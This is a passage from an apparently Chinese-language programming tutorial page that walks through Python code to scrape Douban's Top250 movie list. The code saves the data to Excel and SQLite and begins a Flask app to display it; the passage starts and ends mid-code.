operator">=</span>xlwt<span class="token punctuation">.</span>Workbook<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    worksheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>add_sheet<span class="token punctuation">(</span><span class="token string">'top250'</span><span class="token punctuation">,</span>cell_overwrite_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    col<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'电影详细链接'</span><span class="token punctuation">,</span><span class="token string">'图片链接'</span><span class="token punctuation">,</span><span class="token string">'影片中文名'</span><span class="token punctuation">,</span><span class="token string">'影片外文名'</span><span class="token punctuation">,</span><span class="token string">'评分'</span><span class="token punctuation">,</span><span class="token string">'评价数'</span><span class="token punctuation">,</span><span class="token string">'概况'</span><span class="token punctuation">,</span><span class="token string">'相关信息'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        worksheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>col<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'第</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">条'</span></span><span class="token punctuation">)</span>        data<span class="token operator">=</span>data_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            worksheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span>data<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>savepath<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="sqlite3模块"><a href="#sqlite3模块" class="headerlink" title="sqlite3模块"></a>sqlite3模块</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sqlite3<span class="token comment"># 创建数据表</span>conn<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"test.db"</span><span class="token punctuation">)</span>         <span class="token comment">#打开或创建数据库文件</span>c<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>                         <span class="token comment">#获取游标</span>sql<span class="token operator">=</span><span class="token triple-quoted-string string">'''    create table company    (id int primary key not null,    name text not null,    age int not null,    address char(50),    salary real);'''</span>c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>                           <span class="token comment">#提交数据库操作</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 插入数据</span>conn<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"test.db"</span><span class="token punctuation">)</span>         <span class="token comment">#打开或创建数据库文件</span>c<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>                         <span class="token comment">#获取游标</span>sql<span class="token operator">=</span><span class="token triple-quoted-string string">'''    insert into company(id,name,age,address,salary)    values(1,'zhangsan',32,'chengdu',8000);'''</span>c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>                           <span class="token comment">#提交数据库操作</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 查询数据</span>conn<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"test.db"</span><span class="token punctuation">)</span>         <span class="token comment">#打开或创建数据库文件</span>c<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>                         <span class="token comment">#获取游标</span>sql<span class="token operator">=</span><span class="token string">"select id,name,address,salary from company"</span>cursor<span class="token operator">=</span>c<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token keyword">for</span> row <span class="token keyword">in</span> cursor<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"id= "</span><span class="token punctuation">,</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"name= "</span><span class="token punctuation">,</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"address= "</span><span class="token punctuation">,</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"salary= "</span><span class="token punctuation">,</span>row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="豆瓣Top250存入数据库完整爬虫代码"><a href="#豆瓣Top250存入数据库完整爬虫代码" class="headerlink" title="豆瓣Top250存入数据库完整爬虫代码"></a>豆瓣Top250存入数据库完整爬虫代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> re<span class="token keyword">import</span> xlwt<span class="token keyword">import</span> sqlite3<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    baseurl<span class="token operator">=</span><span class="token string">"https://movie.douban.com/top250?start="</span>    data_list<span class="token operator">=</span>getData<span class="token punctuation">(</span>baseurl<span class="token punctuation">)</span>    <span class="token comment"># savepath="top250.xls"</span>    <span class="token comment"># saveData(data_list,savepath)</span>    dbpath<span class="token operator">=</span><span class="token string">"movie.db"</span>    saveData2DB<span class="token punctuation">(</span>data_list<span class="token punctuation">,</span>dbpath<span class="token punctuation">)</span>findLink<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;a href="(.*?)">'</span><span class="token punctuation">)</span>                    <span class="token comment">#影片详情的匹配规则</span>findImgSrc<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;img.*src="(.*?)"'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>            <span class="token comment">#影片图片，忽略换行符</span>findTitle<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span class="title">(.*)&lt;/span>'</span><span class="token punctuation">)</span>    <span class="token comment">#影片片名</span>findRating<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span class="rating_num" property="v:average">(.*)&lt;/span>'</span><span class="token punctuation">)</span> <span class="token comment">#影片评分</span>findJudge<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span>(\d*)人评价&lt;/span>'</span><span class="token punctuation">)</span>           <span class="token comment">#评价人数               </span>findInduct<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;span class="inq">(.*)&lt;/span>'</span><span class="token punctuation">)</span>     <span class="token comment">#影片概况</span>findBd<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'&lt;p class="">(.*?)&lt;/p>'</span><span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>            <span class="token comment">#详细信息如导演，演员等</span><span class="token keyword">def</span> <span class="token function">askURL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    head<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4128.3 Safari/537.36"</span>    <span class="token punctuation">&#125;</span>    request<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>head<span class="token punctuation">)</span>    html<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        html<span class="token operator">=</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">.</span>URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token string">"code"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>code<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token string">"reason"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>reason<span class="token punctuation">)</span>    <span class="token keyword">return</span> html<span class="token keyword">def</span> <span class="token function">getData</span><span class="token punctuation">(</span>baseurl<span class="token punctuation">)</span><span class="token punctuation">:</span>    data_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url<span class="token operator">=</span>baseurl<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">25</span><span class="token punctuation">)</span>        html<span class="token operator">=</span>askURL<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        soup<span class="token operator">=</span>BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span><span class="token string">"html.parser"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> item <span class="token keyword">in</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">"item"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>             <span class="token comment">#保存一部电影的所有信息</span>            item<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>            link<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findLink<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>   <span class="token comment">#影片详情的超链接</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>link<span class="token punctuation">)</span>            imgSrc<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findImgSrc<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>imgSrc<span class="token punctuation">)</span>            titles<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findTitle<span class="token punctuation">,</span>item<span class="token punctuation">)</span>    <span class="token comment">#片名可能只有一个中文名，没有外文名</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>titles<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                chinese_title<span class="token operator">=</span>titles<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chinese_title<span class="token punctuation">)</span>                foreign_title<span class="token operator">=</span>titles<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment">#去除无关符号</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>foreign_title<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>titles<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>                <span class="token comment">#外文名留空</span>            rating<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findRating<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>rating<span class="token punctuation">)</span>            judgeNum<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findJudge<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>judgeNum<span class="token punctuation">)</span>            Induct<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findInduct<span class="token punctuation">,</span>item<span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Induct<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                Induct<span class="token operator">=</span>Induct<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"。"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Induct<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span>            Bd<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findBd<span class="token punctuation">,</span>item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            Bd<span class="token operator">=</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">"&lt;br(\s+)?/>(\s+)?"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span>Bd<span class="token punctuation">)</span>            Bd<span class="token operator">=</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span>Bd<span class="token punctuation">)</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Bd<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token comment">#去掉前后的空格</span>            data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>     <span class="token keyword">return</span> data_list<span class="token keyword">def</span> <span class="token function">saveData</span><span class="token punctuation">(</span>data_list<span class="token punctuation">,</span>savepath<span class="token punctuation">)</span><span class="token punctuation">:</span>    workbook<span class="token operator">=</span>xlwt<span class="token punctuation">.</span>Workbook<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    worksheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>add_sheet<span class="token punctuation">(</span><span class="token string">'top250'</span><span class="token punctuation">,</span>cell_overwrite_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    col<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'电影详细链接'</span><span class="token punctuation">,</span><span class="token string">'图片链接'</span><span class="token punctuation">,</span><span class="token string">'影片中文名'</span><span class="token punctuation">,</span><span class="token string">'影片外文名'</span><span class="token punctuation">,</span><span class="token string">'评分'</span><span class="token punctuation">,</span><span class="token string">'评价数'</span><span class="token punctuation">,</span><span class="token string">'概况'</span><span class="token punctuation">,</span><span class="token string">'相关信息'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        worksheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>col<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'第</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">条'</span></span><span class="token punctuation">)</span>        data<span class="token operator">=</span>data_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            worksheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span>data<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>savepath<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">saveData2DB</span><span class="token punctuation">(</span>data_list<span class="token punctuation">,</span>dbpath<span class="token punctuation">)</span><span class="token punctuation">:</span>    init_db<span class="token punctuation">(</span>dbpath<span class="token punctuation">)</span>    conn<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>dbpath<span class="token punctuation">)</span>    cur<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> data <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>        <span class="token keyword">for</span> index <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> index<span class="token operator">==</span><span class="token number">4</span> <span class="token keyword">or</span> index<span class="token operator">==</span><span class="token number">5</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            data<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'"'</span><span class="token operator">+</span>data<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'"'</span>        sql<span class="token operator">=</span><span class="token triple-quoted-string string">'''            insert into movie250 (info_link,pic_link,            cname,fname,score,rated,introdu,info)             values(%s)'''</span><span class="token operator">%</span><span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">init_db</span><span class="token punctuation">(</span>dbpath<span class="token punctuation">)</span><span class="token punctuation">:</span>    sql<span class="token operator">=</span><span class="token triple-quoted-string string">'''        create table movie250(            id integer primary key autoincrement,            info_link text,            pic_link text,            cname varchar,            fname varchar,            score numeric,            rated numeric,            introdu text,            info text        );    '''</span>    conn<span class="token operator">=</span>sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>dbpath<span class="token punctuation">)</span>    cursor<span class="token operator">=</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Flask框架–豆瓣电影Top250数据可视化-完整项目文件"><a href="#Flask框架–豆瓣电影Top250数据可视化-完整项目文件" class="headerlink" title="Flask框架–豆瓣电影Top250数据可视化(完整项目文件)"></a>Flask框架–豆瓣电影Top250数据可视化(<a href="https://cdn.jsdelivr.net/gh/ezy0812/CDN/python-project-files/doubantop250.zip">完整项目文件</a>)</h2><h3 id="app-py"><a href="#app-py" class="headerlink" title="app.py"></a>app.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token keyword">import</span> sqlite3app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/movie'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">movie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    datalist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"movie.db"</span><span class="token punctuation">)</span>    cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    sql <span class="token operator">=</span> <span class="token string">"select * from movie250"</span>    data <span class="token operator">=</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> data<span class="token punctuation">:</span>        datalist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"movie.html"</span><span class="token punctuation">,</span> movies<span class="token operator">=</span>datalist<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/score'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">score</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    score <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"movie.db"</span><span class="token punctuation">)</span>    cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    sql <span class="token operator">=</span> <span class="token string">"select score,count(score) from movie250 group by score"</span>    data <span class="token operator">=</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> data<span class="token punctuation">:</span>        score<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        num<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"score.html"</span><span class="token punctuation">,</span> score<span class="token operator">=</span>score<span class="token 